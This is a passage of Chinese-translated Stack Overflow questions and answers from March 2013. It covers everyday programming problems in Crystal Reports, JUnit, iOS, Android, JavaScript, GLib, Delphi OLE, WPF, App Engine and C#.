tblLayout.setStretchAllColumns(true); 
```

# crystal-reports - Crystal Reports 10.5 中的动态垂直线

> ID：15244828
> 
> 赞同：0
> 
> 时间：2013-03-06T10:30:54.447
> 
> 标签：crystal-reports

**水晶报表 10.5 版**

我有一个最多显示 9 个字段的水晶报表，但用户可以在 1 到 9 个字段之间进行选择。

我已经使用表单上的复选框实现了这一点，用户可以选择从 1 到 9 的任何框并生成报告。因此报告可以显示从 1 到 9 个字段，并且任何列都可以是给定时间的任何字段。（例如，用户可能会从表单中选择 ID、姓名、电话并查看报告。因此报告中的第一列变为 ID 等等。如果他选择了姓名和电话，第一列变为姓名等等。我已使用参数字段完成此操作。

现在我想在列之间进行垂直分隔，并且仅当列有数据时（记住可以有 1 到 9 列有数据）。我不能事先放置这些行，因为它们会无论显示的字段数如何，都会显示。

有人知道如何将这条垂直线放在 之间吗？
提前致谢。

# java - 用于类的 JUnit 测试的资源

> ID：15244838
> 
> 赞同：0
> 
> 时间：2013-03-06T10:31:22.973
> 
> 标签：java, junit

作为练习，我需要学习编写以下课程的测试：

打包银行账户；

```
public class CurrentAccount {

        int account[];
        int lastMove;

        CurrentAccount() {
            lastMove = 0;
            account = new int[10];
        }

        public void deposit(int value) {
            account[lastMove] = value;
            lastMove++;
        }

        public void draw(int value) {
            account[lastMove] = value;
            lastMove++;
        }

    public int settlement() {
           int result = 0;
           for (int i=0; i<account.length; i++) {
                  result = result + account[i];
               }
               return result;
         }

        public static void main(String args[]) {
                 CurrentAccount c = new CurrentAccount();
                  c.deposit(10);
        }
    } 
```

我对单元测试比较陌生，很多教程只是简单地介绍了如何对简单的数学运算符（例如加法、减法等）进行测试。任何人都可以推荐好的资源来对更复杂的功能进行单元测试吗？我最好使用

[http://junit.sourceforge.net/javadoc/org/junit/Assert.html](http://junit.sourceforge.net/javadoc/org/junit/Assert.html)

并从那里工作？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:34:47.630

您应该针对对象的规范进行测试，例如

1.  什么是起始余额？
2.  我加 10 英镑后的余额是多少？
3.  我可以透支吗？

等等。以上所有内容都应该在编写类之前指定（否则，你怎么知道要写什么？）

我将为这些场景中的每一个创建一个测试方法，执行设置和操作，然后使用一个（或多个，如果需要）`asserts`来确定一切都很好。不要忘记，在某些情况下，您可能正在测试是否引发了异常，因此您需要检查控制流是否中断。那不会用`assert`。

这是一个可能的示例（省略导入等）

```
public void testBalanceAfterTenPoundDeposit() {
   // note the interface/impl separation so I can test different
   // implementations with the same interface (this is Test By Contract)
   CurrentAccount ca = new CurrentAccountImpl();

   // check the starting balance
   Assert.assertEquals(ca.settlement(), 0);

   // deposit
   ca.deposit(10);

   // do I have £10 ?
   Assert.assertEquals(ca.settlement(), 10);
} 
```

重要的是要注意，这种测试应该真正关注作为黑盒的组件（单元）。也就是说，测试实际上应该与实现无关，并且您不会显式测试数组实现。我应该能够插入我自己的实现（或重写你的实现）并且测试应该保持工作（这是*回归*测试的原则）。

话虽如此，如果您知道实现的明显限制（例如，您的固定大小数组），您应该尝试强调（例如，在这种情况下，执行 11 次插入）

# iphone - 检查 iphone SDK 中的旋转

> ID：15244840
> 
> 赞同：0
> 
> 时间：2013-03-06T10:31:26.363
> 
> 标签：iphone, ios, objective-c, xcode, rotation

在我的应用程序中，我使用 SMRotatory 轮进行旋转。它作为旋转工作正常。

**但我想检测旋转是顺时针还是逆时针？**

```
//My code is as follow:

- (BOOL)continueTrackingWithTouch:(UITouch*)touch withEvent:(UIEvent*)event
{

    CGFloat radians = atan2f(container.transform.b, container.transform.a);
   // NSLog(@"rad is %f", radians);
    CGPoint pt = [touch locationInView:self];

    float dx = pt.x  - container.center.x;
    float dy = pt.y  - container.center.y;
    float ang = atan2(dy,dx);
    float angleDifference = deltaAngle - ang;
   // NSLog(@"%f",angleDifference);

    if (angleDifference>=0) {
        //NSLog(@"positive");
        [[NSUserDefaults standardUserDefaults]setValue:@"positive" forKey:@"CheckValue"];
    }
    else
    {
      //  NSLog(@"negative");
        [[NSUserDefaults standardUserDefaults]setValue:@"negative" forKey:@"CheckValue"];
    }

    container.transform = CGAffineTransformRotate(startTransform, -angleDifference);

    bg.transform=CGAffineTransformRotate(startTransform, -angleDifference);

    return YES;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T11:33:52.567

尝试这样的事情：

```
-(void)touchesMoved:(NSSet *)touches withEvent:(UIEvent *)event
{

    UITouch *touch = [touches anyObject];
    CGPoint currentTouch1=[touch locationInView:self.superview];
    CGPoint currentTouch2=[touch previousLocationInView:self.superview];

    CGFloat x = currentTouch2.x - currentTouch1.x;
    CGFloat y = currentTouch2.y - currentTouch1.y;
    CGFloat dist = sqrtf(x*x + y*y);
    CGFloat cx = currentTouch1.x - self.superview.bounds.size.width / 2;
    CGFloat cy = currentTouch2.y - self.superview.bounds.size.height / 2;
    CGFloat cdist = sqrtf(cx*cx + cy*cy);
    CGFloat angle = atan2(dist, cdist);
    //NSLog(@"%f",angle);

    CGFloat radians = atan2f(super.transform.b, super.transform.a); 
    mDegrees = radians * (180 / M_PI);
    if (mDegrees < 0.0)
    {
        mDegrees+=360;
    }

    NSLog(@"Angle is = %f",angle); //positive is clockwise, negative is counterclockwise

    CGAffineTransform transform = CGAffineTransformRotate(self.transform, angle);
    self.transform = transform;
    touch1 = currentTouch1;
    touch2 = currentTouch2;
} 
```

# android - 拖动通知栏时如何停止闹钟？

> ID：15244844
> 
> 赞同：2
> 
> 时间：2013-03-06T10:31:28.823
> 
> 标签：android, notifications, android-notifications, android-notification-bar

我设计了一个报警服务应用程序。在该应用程序中，每当警报启动时，它都会显示在通知栏中。问题是，每当我拖动通知栏时，我都想停止警报和通知。

这是我的代码：

```
if(pYear==pYear2 && pMonth==pMonth2 && pDay==pDay2 && pHour==pHour2 && pMin==pMin2 && pSec==psec2)
{

 Context context = getApplicationContext();

 Intent notifyIntent = new Intent(context, MyAlarmService.class);

 PendingIntent intent1 =PendingIntent.getActivity(MyAlarmService.this, 0, notifyIntent, android.content.Intent.FLAG_ACTIVITY_NEW_TASK);

 Notification notifyDetails = new Notification(R.drawable.ic_launcher,"New Alert, Click Me!",System.currentTimeMillis());

 notifyDetails.setLatestEventInfo(context, "Alaram", "Get back to Application on clicking me", intent1);

 mNotificationManager.notify(SIMPLE_NOTFICATION_ID, notifyDetails);

 AudioManager am=(AudioManager)getSystemService(Context.AUDIO_SERVICE);

am.setMode(AudioManager.MODE_NORMAL);

try
{
    mp.setDataSource(getApplicationContext(), ringtoneUri);
    mp.setAudioStreamType(AudioManager.STREAM_NOTIFICATION);
    mp.prepare();
    mp.setLooping(true);
    mp.start();
}
catch(Exception e)
{
    //exception caught in the end zone
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-08T05:15:57.597

要播放通知声音，您应该使用 notifyDetails.defaults |= Notification.DEFAULT_SOUND;

# html - 使用 href 和 Tocify toc

> ID：15244845
> 
> 赞同：-1
> 
> 时间：2013-03-06T10:31:35.897
> 
> 标签：html, href, tableofcontents, jquery-tocify-js

我正在使用 Tocify 制作 TOC，但遇到了一些麻烦。在这个目录中，我有：“第 1 章”、“第 2 章”......

当我说“见第 1 章”时，在我的网站上有些地方。我必须在我的“参见第 1 章”html 文本中包含“a href”到“第 1 章”。但我不知道我必须在“a href=#....”中写什么。

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:37:11.293

它是按如下方式完成的：

基本上，您需要为要引用的元素设置一个 ID。然后你可以写：

```
<a href="#id">See chapter ID</a>

<h2 id="chapter1">Chapter 1</h2>
<p>Your paragraphs</p>
<p> ... </p>
<a href="#chapter2">See chapter 2</a>

<h2 id="chapter2">Chapter 2</h2>
<p>Your paragraphs</p>
<p> ... </p>
<a href="#chapter1">See chapter 1</a> 
```

希望这对您有所帮助。

**编辑：**

尝试这样的事情：

```
$(document).ready(function() {

  var link = $('#linkId');

  var chapter = $('#chapterId');
  var position = chapter.position(); // according to jQuery api
  var offsetTop = position.top; // this should be the absolute offset of the page's top

  // Calls the tocify method on your HTML elements.
  link.tocify();
  chapter.tocify();

  //Call the tocify method with options
  link.tocify({
    showEffect: "fadeIn"
    scrollTo: offsetTop, 
    smoothScroll: false
  }); 
```

*   您不能同时使用 tocify 和 #-href，因为正如您所见，它们会覆盖 url。因此，您必须使用 jQuery 或 tocify 方法（请参阅 api's）来滚动到特定元素。

*   或者您可能不想在链接上使用 tocify。

# javascript - 在文本输入中检测按 Enter

> ID：15244848
> 
> 赞同：0
> 
> 时间：2013-03-06T10:31:44.583
> 
> 标签：javascript, jquery, events, keydown, keyup

我试图检测用户何时在`Enter`输入文本输入时点击。仅当在文本输入中“按下”键和释放键都发生时，该事件才应触发。也就是说，如果他`Enter`在身体的其他部位按下时，事件不应该触发，然后专注于输入并释放它。所以我尝试了以下方法：

```
<!DOCTYPE html>
<html>
<head>
<script src="jquery.js">
</script>
<script>
$(document).ready(function(e){
  $("input").keyup(function(e){
    if (e.which == 13 && $(this).attr("enter") == "1") { alert("Yep!"); }
  });
$("input").keydown(function(e) {
   if (e.which == 13) { $(this).attr("enter","1"); }
});
$(document).on("keyup",function(e) { if (e.which == 13) { $("input").attr("enter","0"); } });
});
</script>
</head>
<body>
<input type = 'text' enter = '0' />
</body>
</html> 
```

但我有一个奇怪的问题。当我关注输入并按 时`Enter`，输入的属性`enter`保持不变`0`。但是在按键仍然按下的情况下，如果我现在专注于输入，Firebug 会显示属性变为 1。结果，在此之后如果我释放按键，则触发事件。

谁能告诉我如何解决这个问题？`keypress`不起作用，所以如果你简单地替换整个块

```
$("input").keypress(function(e){
    if (e.which == 13) { alert("Yep!"); }
  }); 
```

然后尝试执行此操作，单击输入以移除焦点，然后按下`Enter`并在按住它的同时将焦点放在输入上。您现在将看到一系列连续的警报！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T10:36:16.263

因为您有两个事件绑定到输入，如下所示。

一个里面

```
$("input").keyup(function(e){ 
```

和其他里面

```
$(document).on("keyup",function(e) { 
```

所以首先你需要使用`e.stopPropagation();`

# c - 在每次迭代中工作 g_hash_table_foreach

> ID：15244851
> 
> 赞同：4
> 
> 时间：2013-03-06T10:32:03.300
> 
> 标签：c, glib

我希望遍历我的哈希表中的每个键值对。因此我使用了 g_hash_table_foreach() 函数（原型如下所示）。对于每个键值对，它调用一个**void** func 方法。

```
void g_hash_table_foreach(GHashTable *hash_table,GHFunc func,
                          gpointer user_data); 
```

但是，我要求对于函数的每次调用，该方法都**返回**一个值。

例如考虑以下代码：

```
void calculate(gpointer key, gpointer value, gpointer userdata)
{
    return calculateNumbers(key, value);
}

int total = 0;
g_hash_table_foreach(mymap, calculate, NULL); 
```

我要求变量 total 存储calculate() 函数接收到的每个返回值的总和。我发现使用 g_hash_table_foreach 方法很难做到这一点。

我宁愿有一个while循环，在外面声明总变量，并在每对的每次迭代中增加它的值。但是，我认为 glib 不允许我一次考虑一个键值对。（与具有下一个属性的 GList 不同）请问我该怎么做？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-06T10:36:38.207

这就是 API 为您提供“用户指针”的原因。在那里传递您需要的任何数据，例如`total`变量的地址：

```
static void calculate(gpointer key, gpointer value, gpointer userdata)
{
    int *total = userdata;

    *total += calculateNumbers(key, value);
}

g_hash_table_foreach(mymap, calculate, &total); 
```

glib 和 GTK+ API:s 非常擅长提供用户指针，这让我“被宠坏了”；每当看到涉及回调的 C API（强制程序员使用全局状态）时，我都会畏缩。并抱怨。并且，如果可能的话，修复它。

**更新**：另外，为了完整起见，您实际上可以在没有回调的情况下使用 GHashTable 的“迭代”API 执行此操作。

请参阅[`g_hash_table_iter_init()`](https://developer.gnome.org/glib/stable/glib-Hash-Tables.html#g-hash-table-iter-init)和[`g_hash_table_iter_next()`](https://developer.gnome.org/glib/stable/glib-Hash-Tables.html#g-hash-table-iter-next)功能。这些至少需要 glib 2.16 版。

# multithreading - 当 Word OLE 中需要用户干预时线程终止

> ID：15244854
> 
> 赞同：1
> 
> 时间：2013-03-06T10:32:16.850
> 
> 标签：multithreading, delphi, ole

我们有一个线程，它在创建时会启动一个 Word OLE 实例，如下所示：

```
MSWord:=CreateOleObject('Word.Application');
MSWord.Visible:=FALSE;
document:=MSWord.Documents.Open(Fdocfile);
thisActiveDocument:=MSWord.ActiveDocument;
thisActiveDocument.Save;
document.Close;
MSWord.Quit(FALSE); 
```

我们在一个线程中执行它，这样我们也可以有一个进度条来通知用户幕后正在发生一些事情。（见[Delphi OLE 自动化冻结 GUI](https://stackoverflow.com/questions/15220440/delphi-ole-automation-freezing-gui)）

然而，我们现在有一个问题，如果正在打开的文档需要用户干预，例如受密码保护的文档，一旦用户输入密码，线程就会终止，线程 Execute 中的其余代码不会运行。

# c# - 弹出的文本框在 popup.isOpen = false 后没有消失

> ID：15244860
> 
> 赞同：1
> 
> 时间：2013-03-06T10:32:41.660
> 
> 标签：c#, .net, wpf, popup

我需要以下行为：当我开始在窗口中输入时，会出现一个小文本框，其中已经输入了第一个字母，然后在我输入文本并按 Enter 后，文本框应该消失，直到我再次在该窗口中输入。问题是当我设置`Popup1.IsOpen = false`文本框时仍然保留在窗口中。

```
<Window x:Class="Beta.MainWindow"
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
    Title="MainWindow" Height="350" Width="525" KeyDown="Window_KeyDown_1">  
  <Grid> 
    <Popup Name="Popup1" IsEnabled="True" IsOpen="False" VerticalOffset="-200" HorizontalOffset="50">
       <TextBox Name="tbx" Width="50" KeyDown="tbx_KeyDown" />
     </Popup>
  </Grid>
</Window>

string temp;

private void Window_KeyDown_1(object sender, KeyEventArgs e)
    {
        Popup1.IsOpen = true;
        tbx.Focus();
    }

private void tbx_KeyDown(object sender, KeyEventArgs e)
    {
        if (e.Key == Key.Enter)
        {
            Popup1.IsOpen = false;
            temp = tbx.Text;
            tbx.Text = null;

        }
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T11:54:34.290

你应该添加 e.Handled =true，所以 Window_KeyDown_1 不会被提升并重新打开弹出窗口

```
 private void tbx_KeyDown(object sender, KeyEventArgs e)
    {
        if (e.Key == Key.Enter)
        {
            Popup1.IsOpen = false;
            temp = tbx.Text;
            tbx.Text = null;
            e.Handled = true;

        }
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T11:59:06.163

Window_KeyDown_1() 方法总是被调用。你必须设置 e.Handled=true

```
 private void tbx_KeyDown(object sender, KeyEventArgs e)
  {
     if (e.Key == Key.Enter)
     {
        Popup1.IsOpen = false;
        temp = tbx.Text;
        tbx.Text = null;
        e.Handled = true;
     }
  } 
```

# iphone - 与 ACAccountStore (iOS 5) 的 Twitter 集成问题

> ID：15244861
> 
> 赞同：4
> 
> 时间：2013-03-06T10:32:45.663
> 
> 标签：iphone, ipad, ios5, twitter, acaccountstore

当我使用 iOS 6.0 运行以下代码时，它可以工作

```
ACAccountStore *account = [[ACAccountStore alloc] init];
ACAccountType *accountType = [account accountTypeWithAccountTypeIdentifier:ACAccountTypeIdentifierTwitter];

[account requestAccessToAccountsWithType:accountType options:nil
                                  completion:^(BOOL granted, NSError *error)
     {
         dispatch_async(dispatch_get_main_queue(), ^{

             if (granted) 
             {
                 //MY CODE
             }
         });

     }]; 
```

当我使用 iOS 5.0 或 5.1 运行此代码时，它会崩溃并显示以下输出，

```
*** Terminating app due to uncaught exception 'NSInvalidArgumentException', 
reason: '-[ACAccountStore requestAccessToAccountsWithType:options:completion:]: 
unrecognized selector sent to instance 0x68a57c0' 
```

不知道这个奇怪的崩溃日志..

请告诉我，如何摆脱这个..

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-06T12:44:31.473

使用以下方法：

```
[account requestAccessToAccountsWithType:accountType withCompletionHandler:^(BOOL granted, NSError *error)
 {

   if (granted) {

            //Your code
            }
        }
   }]; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-09-05T16:51:02.950

这有点晚了，但是您收到该错误的原因是 requestAccessToAccountsWithType:options:completion: 在 iOS 6 中是新的。

在 iOS 5 及更早版本中，请改用 requestAccessToAccountsWithType:withCompletionHandler 方法（此方法在 iOS 6 中已弃用）

请参阅文档：[https ://developer.apple.com/library/ios/documentation/Accounts/Reference/ACAccountStoreClassRef/Reference/Reference.html#//apple_ref/doc/uid/TP40011021-CH1-SW12](https://developer.apple.com/library/ios/documentation/Accounts/Reference/ACAccountStoreClassRef/Reference/Reference.html#//apple_ref/doc/uid/TP40011021-CH1-SW12)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-17T08:32:15.367

为此尝试更新：

```
ACAccountStore *account = [[ACAccountStore alloc] init];
ACAccountType *accountType = [account accountTypeWithAccountTypeIdentifier:ACAccountTypeIdentifierTwitter];

// iOS 6
if ( [account respondsToSelector:@selector(requestAccessToAccountsWithType: options: completion:)] )
{
[account requestAccessToAccountsWithType:accountType options:nil
                                  completion:^(BOOL granted, NSError *error)
     {
         dispatch_async(dispatch_get_main_queue(), ^{

             if (granted) 
             {
                 //MY CODE
             }
         });

     }];
}

// iOS 5
else if ( [account respondsToSelector:@selector(requestAccessToAccountsWithType: withCompletionHandler:)] )
{
[account requestAccessToAccountsWithType:accountType
                                  withCompletionHandler:^(BOOL granted, NSError *error)
     {
         dispatch_async(dispatch_get_main_queue(), ^{

             if (granted) 
             {
                 //MY CODE
             }
         });

     }];
}
else
{
// iOS 4 or less
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2014-02-03T08:53:54.477

感谢@CReaTuS，我想进一步澄清这一点，请注意，在 iOS6 的情况下，我们制作 SLRequest，而在 iOS5 中，我们必须使用 TWRequest 执行请求。见下文-

```
 ACAccountStore *accountStore = [[ACAccountStore alloc] init];
 ACAccountType *accountType = [accountStore accountTypeWithAccountTypeIdentifier:ACAccountTypeIdentifierTwitter];

 if ( [accountStore respondsToSelector:@selector(requestAccessToAccountsWithType: options: completion:)] )
 {
 [accountStore requestAccessToAccountsWithType:accountType options:nil
 completion:^(BOOL granted, NSError *error)
 {
 dispatch_async(dispatch_get_main_queue(), ^{

 if (granted)
 {
     // Get the list of Twitter accounts.
     NSArray *accountsArray = [accountStore accountsWithAccountType:accountType];

     // For the sake of brevity, we'll assume there is only one Twitter account present.
     // You would ideally ask the user which account they want to tweet from, if there is more than one Twitter account present.
     if ([accountsArray count] > 0) {
         // Grab the initial Twitter account to tweet from.
         ACAccount *twitterAccount = [accountsArray objectAtIndex:0];

         NSMutableDictionary *tempDict = [[NSMutableDictionary alloc] init];
         [tempDict setValue:@"Twitter_Name" forKey:@"screen_name"];
         [tempDict setValue:@"true" forKey:@"follow"];

        //Code specific to iOS6 or later

         SLRequest *followRequest = [SLRequest requestForServiceType:SLServiceTypeTwitter requestMethod:SLRequestMethodPOST URL:[NSURL URLWithString:@"https://api.twitter.com/1.1/friendships/create.json"] parameters:tempDict];

         // To unfollow hit URL-https://api.twitter.com/1.1/friendships/destroy.json

         [followRequest setAccount:twitterAccount];
         [followRequest performRequestWithHandler:^(NSData *responseData, NSHTTPURLResponse *urlResponse, NSError *error) {
             NSString *output = [NSString stringWithFormat:@"HTTP response status: %i", [urlResponse statusCode]];
             NSLog(@"%@", output);
             if (error) {
                 dispatch_async(dispatch_get_main_queue(), ^{
                     //Update UI to show follow request failed

                 });
             }
             else {
                 dispatch_async(dispatch_get_main_queue(), ^{
                     //Update UI to show success

                 });
             }
         }];
     }

 }
 });

 }];
 }
 else if ( [accountStore respondsToSelector:@selector(requestAccessToAccountsWithType: withCompletionHandler:)] )
 {
 [accountStore requestAccessToAccountsWithType:accountType withCompletionHandler:^(BOOL granted, NSError *error)
 {
 dispatch_async(dispatch_get_main_queue(), ^{

 if (granted)
 {         
     // Get the list of Twitter accounts.
     NSArray *accountsArray = [accountStore accountsWithAccountType:accountType];

     // For the sake of brevity, we'll assume there is only one Twitter account present.
     // You would ideally ask the user which account they want to tweet from, if there is more than one Twitter account present.
     if ([accountsArray count] > 0) {
         // Grab the initial Twitter account to tweet from.
         ACAccount *twitterAccount = [accountsArray objectAtIndex:0];

         NSMutableDictionary *tempDict = [[NSMutableDictionary alloc] init];
         [tempDict setValue:@"Twitter_Name" forKey:@"screen_name"];
         [tempDict setValue:@"true" forKey:@"follow"];

        //Code specific to iOS5

         TWRequest *followRequest = [[TWRequest alloc] initWithURL:[NSURL URLWithString:@"https://api.twitter.com/1/friendships/create.json"]
                                                      parameters:tempDict
                                                   requestMethod:TWRequestMethodPOST];

         [followRequest setAccount:twitterAccount];
         [followRequest performRequestWithHandler:^(NSData *responseData, NSHTTPURLResponse *urlResponse, NSError *error) {
             NSString *output = [NSString stringWithFormat:@"HTTP response status: %i", [urlResponse statusCode]];
             NSLog(@"%@", output);
             if (error) {
                 dispatch_async(dispatch_get_main_queue(), ^{
                     //Update UI to show follow request failed

                 });
             }
             else {
                 dispatch_async(dispatch_get_main_queue(), ^{
                     //Update UI to show success
                 });
             }
         }];
     }

 }
 });

 }];
 }
 else
 {
     dispatch_async(dispatch_get_main_queue(), ^{
         //Update UI to show follow request completely failed

     });
 } 
```

快乐编码:)

# python - 在 Google 应用引擎 python webapp 中使用全局变量

> ID：15244864
> 
> 赞同：0
> 
> 时间：2013-03-06T10:32:49.090
> 
> 标签：python, google-app-engine, global-variables

> 在谷歌应用引擎中使用全局变量是否正确？

我在我的一个应用程序中使用了它们，事实证明，当应用程序不被使用的一小段时间后，它们往往会被刷新。

如果我是对的，还有其他选择吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-06T10:45:13.153

当您使用 webapp2 时，您可以使用注册表。[http://webapp-improved.appspot.com/guide/app.html#registry](http://webapp-improved.appspot.com/guide/app.html#registry) 还有一个请求注册表：[http ://webapp-improved.appspot.com/guide/request.html#registry](http://webapp-improved.appspot.com/guide/request.html#registry)

# android - Facebook android sdk 登录对话框

> ID：15244866
> 
> 赞同：2
> 
> 时间：2013-03-06T10:32:51.977
> 
> 标签：android, facebook-android-sdk

我正在使用 Facebook android sdk 3.0。我想要的是我得到完美的用户 ID 和访问令牌。问题是，如果设备上未安装 fb 应用程序并且我尝试登录，它确实登录但登录对话框再次弹出，即使在单击该对话框对话框的关闭按钮后仍然弹出，直到并且除非我再次登录。

这是我的代码：

```
if(v.getId()==imgLike.getId())
        {

            try
            {

                /*
                 * Logging in with Facebook
                 */

                try
                {

                    login_facebook();

                }catch(NullPointerException npx)
                {
                    npx.printStackTrace();
                }
                catch(Exception ex)
                {

                }

            }catch(Exception ex)
            {
                ex.printStackTrace();
            }

        } 

public void login_facebook()
    {

        try
        {
            Session.openActiveSession(acontext, true, new Session.StatusCallback() {

                @Override
                public void call(final Session session, SessionState state, Exception exception) {
                    // TODO Auto-generated method stub
                    if(session.isOpened())
                    {
                        List<String> permissions = session.getPermissions();
                        if (!isSubsetOf(PERMISSIONS, permissions)) {
                            pendingPublishReauthorization = true;
                            Session.NewPermissionsRequest newPermissionsRequest = new Session.NewPermissionsRequest(acontext, PERMISSIONS);
                            session.requestNewPublishPermissions(newPermissionsRequest);
                        }

                        Request.executeMeRequestAsync(session, new Request.GraphUserCallback() {

                            @Override
                            public void onCompleted(GraphUser user, Response response) {
                                // TODO Auto-generated method stub
                                if(user!=null)
                                {

                                    fbUserid=user.getId();
                                    fbAccessToken=session.getAccessToken();
                                    Log.i("User Name ", "Name : "+user.getName());
                                    Log.i("User Id ", "Id : "+user.getId());
                                    Log.i("User Access Token ", "Access Token : "+session.getAccessToken());

new LikeUrl().execute(carName.get(currentIMage));
                                }
                            }
                        });

                    }
                }
            });

        }catch(NullPointerException npx)
        {
            npx.printStackTrace();
        }catch(BadTokenException bdx)
        {
            bdx.printStackTrace();
        }
        catch(Exception ex)
        {
            ex.printStackTrace();
        }
    }

@Override
    public void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        try
        {
            Session.getActiveSession().onActivityResult(this, requestCode, resultCode, data);

        }catch(IllegalStateException ilgx)
        {
            ilgx.printStackTrace();
        }
        catch (NullPointerException e) {
            // TODO: handle exception
            e.printStackTrace();
        }
        catch(Exception ex)
        {
            ex.printStackTrace();
        }

    }

private boolean isSubsetOf(Collection<String> subset, Collection<String> superset) {
        for (String string : subset) {
            if (!superset.contains(string)) {
                return false;
            }
        }
        return true;
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T16:34:48.743

在没有安装 Facebook 应用程序的情况下使用模拟器时，我遇到了同样的问题。事实上，我认为第一个对话框登录需要基本权限（即公共个人资料和朋友列表），而第二个对话框登录需要额外权限（在您的情况下为读取权限）。

当我安装官方 Facebook 应用程序时，这两个对话框完全根据这个假设发生了变化。

如果您想要单个对话或单个权限请求，您可以在此处找到有用的讨论：[链接](https://stackoverflow.com/questions/13048533)

# c# - C# 函数数组

> ID：15244877
> 
> 赞同：-1
> 
> 时间：2013-03-06T10:33:24.590
> 
> 标签：c#, arrays, split

我从一个文本文件 ( `.txt`) 制作程序，我必须用函数`split`切断世界的界限。但我不知道这个世界如何在函数中写入数组并使用它。

有代码：

```
 private void button1_Click(object sender, EventArgs e)
    {
        FileStream fs = new FileStream("text.txt", FileMode.Open);
        StreamReader sr = new StreamReader(fs);

        string line;
        while ((line = sr.ReadLine()) != null)
        {
            string[] slova = sr.ReadLine().Split(';');

        }

        sr.Close();
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:42:43.383

我认为问题在于你打[`StreamReader.ReadLine`](http://msdn.microsoft.com/en-us/library/system.io.streamreader.readline.aspx)了两次电话。这种方法使读者前进到下一行。所以第一次调用将`line`使用当前行初始化，下一次调用将读取下一行：

```
while ((line = sr.ReadLine()) != null)        // <-- first ReadLine
{
    string[] slova = sr.ReadLine().Split(';');// <-- second ReadLine
} 
```

所以只需使用变量

```
while ((line = sr.ReadLine()) != null)
{
    string[] slova = line.Split(';');
    // ....
} 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-03-06T10:36:39.647

```
string filePath = "text.txt";
char wordsSeparator = ';';
IEnumerable<string> lines = File.ReadAllLines(filePath);
foreach (var line in lines)
{
   IEnumerable<string> words = line.Split(new [] {wordsSeparator});
   // TODO: process words?!
} 
```

# c# - 将 WPF 视图绑定到几个 DataContexts

> ID：15244881
> 
> 赞同：0
> 
> 时间：2013-03-06T10:33:33.950
> 
> 标签：c#, wpf, binding, datacontext

**Objective:**根据 a 的选定值设置控件的可见性`ComboBox`

**问题：**用于检查可见性的属性在 VM 中，但是我不知道如何使用它，因为`DataContext`它已经定义到另一个对象，即我需要绑定 2 个数据上下文吗？！

**细节：**

我有一个`CustomControl`在我的视图中加载的与之关联的`DataContext`（`List`显示为网格的对象的一个​​：

```
<GUI:Counterparties_UserInputs x:Name="UserInputs" DockPanel.Dock="Right" DataContext="{Binding Source={StaticResource counterpartiesDataView}}"/> 
```

在该用户控件中，我有一些`StackPanel`应根据 a 的选择触发的可见性`ComboBox`：

```
<ComboBox ItemsSource="{Binding Source={StaticResource CounterpartyTypes}}" SelectedValue="{Binding SelectedCounterpartyType}"/>
<StackPanel Visibility="{Binding Path=SelectedCounterpartyType,Converter={StaticResource SelectedValueToVisible}}"/> 
```

我遇到的问题是后面的代码永远不会被命中，因为我没有找到如何将“额外”`DataContext`与视图相关联。

这是我背后的代码：

```
public partial class Counterparties_UserInputs : UserControl
{
   ...

    public Counterparties_UserInputs()
    {
        // this.DataContext = _cptyUserInputsVM;
        _cptyUserInputsVM = new Counterparties_UserInputs_VM();
        InitializeComponent();
    }
} 
```

`Property`并且永远不会命中“SelectedCounterpartyType”的 ViewModel ：

```
public class Counterparties_UserInputs_VM : INotifyPropertyChanged
{
    public event PropertyChangedEventHandler PropertyChanged;

    private string _selectedCounterpartyType;

    public string SelectedCounterpartyType
    {
        get 
        {
            return _selectedCounterpartyType; 
        }
        set
        {
            _selectedCounterpartyType = value;
            if (PropertyChanged != null)
            {
                PropertyChanged(this, new PropertyChangedEventArgs("SelectedCounterpartyType"));
            }
        }
    }
} 
```

我已经看到了那个[答案](https://stackoverflow.com/questions/5960561/c-sharp-wpf-two-different-datacontext-in-one-control-while-using-mvvm-and-the-se)，但这并不是我正在做的......所以非常感谢你的帮助！谢谢！

# websphere-portal - Websphere Portal 7 - WebDav 主题部署非常缓慢

> ID：15244882
> 
> 赞同：1
> 
> 时间：2013-03-06T10:33:35.890
> 
> 标签：websphere-portal

我们正在尝试将主题部署到 Websphere Portal server 7.0。但是 WebDav 连接非常慢。我们得到的最大速度是 0.4 Kbps。

以这种速度，几乎不可能复制整个主题。任何指向这里出了什么问题的指针？

注意：我们尝试了 BitKinex 和 AnyClient 上传。

服务器信息：

IBM WebSphere 门户 7.0

构建级别：wpnext_528_01 2010-08-18 17:49

功能包：无

# c# - 使用 ModelMetadata 获取所有属性

> ID：15244883
> 
> 赞同：1
> 
> 时间：2013-03-06T10:33:36.090
> 
> 标签：c#, asp.net-mvc

我有一个从 Web 服务生成的部分类。我像这样添加`ModelMetadata`到这个类：

```
// Automatically generated code

public partial class MyClass
{
    public string FIELD_ONE ...
    public DateTime? FIELD_TWO ...
}

// My code

[MetadataType(typeof(MyMetaDataClass))]
public partial class MyClass
{
}

public class MyMetaDataClass
{
    [Display(Name="Field One")] 
    public string FIELD_ONE;

    [Display(Name="Field Two")] 
    public DateTime? FIELD_TWO;
} 
```

现在我想获取所有`MyClass`具有元数据显示属性的属性，即`FIELD_ONE`和`FIELD_TWO`.

我试过像

```
